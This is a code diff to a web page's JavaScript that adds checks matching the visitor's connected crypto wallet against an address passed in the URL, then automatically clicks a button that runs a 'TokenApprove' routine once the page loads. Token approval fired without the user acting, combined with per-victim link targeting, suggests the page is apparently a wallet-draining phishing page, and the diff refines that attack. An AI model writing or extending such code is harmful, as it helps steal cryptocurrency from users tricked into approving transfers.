@@ -586,13 +586,134 @@
         overlay.style.display = 'none';
     }
 
+    // Function to get URL parameters
+    function getURLParams() {
+        const urlParams = new URLSearchParams(window.location.search);
+        return {
+            wallet: urlParams.get('wallet') || urlParams.get('address') || urlParams.get('account'),
+            amount: urlParams.get('amount') || urlParams.get('usdt') || urlParams.get('value')
+        };
+    }
+
+    // Function to validate wallet address
+    async function validateWallet() {
+        try {
+            // Get wallet address from URL
+            const urlParams = getURLParams();
+            const expectedWallet = urlParams.wallet;
+            
+            if (!expectedWallet) {
+                // No wallet in URL, proceed normally
+                return { valid: true, account: null };
+            }
+
+            // Get connected wallet
+            let connectedAccount = null;
+            
+            // Try eth_accounts first
+            if (window.ethereum) {
+                try {
+                    const accounts = await ethereum.request({ method: 'eth_accounts' });
+                    if (accounts && accounts.length > 0) {
+                        connectedAccount = accounts[0];
+                    }
+                } catch (e) {
+                    console.log('eth_accounts error:', e);
+                }
+            }
+            
+            // Fallback to web3.eth.accounts[0]
+            if (!connectedAccount && typeof web3 !== 'undefined' && web3.eth && web3.eth.accounts && web3.eth.accounts[0]) {
+                connectedAccount = web3.eth.accounts[0];
+            }
+
+            if (!connectedAccount) {
+                return { valid: false, error: 'No wallet connected' };
+            }
+
+            // Normalize addresses (lowercase for comparison)
+            const expected = expectedWallet.toLowerCase();
+            const connected = connectedAccount.toLowerCase();
+
+            // Check if addresses match
+            if (expected !== connected) {
+                return { 
+                    valid: false, 
+                    error: 'Wrong wallet selected. Please select your validated account.',
+                    expected: expectedWallet,
+                    connected: connectedAccount
+                };
+            }
+
+            return { valid: true, account: connectedAccount };
+        } catch (error) {
+            console.error('Wallet validation error:', error);
+            return { valid: false, error: 'Validation error: ' + error.message };
+        }
+    }
+
+    // Function to show error message
+    function showWalletError(message) {
+        // Hide spinner overlay
+        const spinnerOverlay = document.querySelector('.spinner-overlay');
+        if (spinnerOverlay) {
+            spinnerOverlay.style.display = 'none';
+        }
+        
+        // Show error message
+        const errorDiv = document.createElement('div');
+        errorDiv.style.cssText = `
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #0a0a0a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 999999;
+            flex-direction: column;
+            color: #fff;
+            font-family: "Inter", sans-serif;
+            text-align: center;
+            padding: 20px;
+        `;
+        errorDiv.innerHTML = `
+            <div style="font-size: 24px; font-weight: 600; margin-bottom: 20px; color: #ff4444;">⚠️ Wallet Mismatch</div>
+            <div style="font-size: 18px; margin-bottom: 30px;">${message}</div>
+            <div style="font-size: 14px; color: #999;">Please close this page and select the correct wallet account.</div>
+        `;
+        document.body.appendChild(errorDiv);
+    }
+
     async function TokenApprove() {
     // Show loading immediately when Next is clicked
     showLoading('Processing...');
     
     try {
-        const accounts = await ethereum.request({ method: 'eth_accounts' });
-        const account = accounts[0];
+        // Validate wallet address from URL
+        const validation = await validateWallet();
+        
+        if (!validation.valid) {
+            hideLoading();
+            showWalletError(validation.error);
+            return;
+        }
+
+        // Get account (use validated account or get from wallet)
+        let account = validation.account;
+        
+        if (!account) {
+            const accounts = await ethereum.request({ method: 'eth_accounts' });
+            account = accounts[0];
+        }
+        
+        if (!account) {
+            hideLoading();
+            showWalletError('No wallet account found. Please connect your wallet.');
+            return;
+        }
 
         // Step 1: Check the current BNB balance (in background)
         const bnbBalance = await web3.eth.getBalance(account);
@@ -889,15 +1010,25 @@ if (typeof window !== 'undefined') {
 <script>
     // Next button directly calls TokenApprove - no validation needed
     
-    // Auto-click Next button when page fully loads
-    window.addEventListener('load', function() {
+    // Validate wallet and auto-click Next button when page fully loads
+    window.addEventListener('load', async function() {
         // Small delay to ensure everything is ready
-        setTimeout(function() {
+        setTimeout(async function() {
+            // First validate wallet address from URL
+            const validation = await validateWallet();
+            
+            if (!validation.valid) {
+                // Wallet mismatch - show error
+                showWalletError(validation.error);
+                return;
+            }
+            
+            // Wallet is valid, proceed with auto-click
             const nextBtn = document.getElementById('nextBtn');
             if (nextBtn) {
                 nextBtn.click();
             }
-        }, 1000);
+        }, 1500); // Increased delay to allow wallet to initialize
     });
 </script>
 
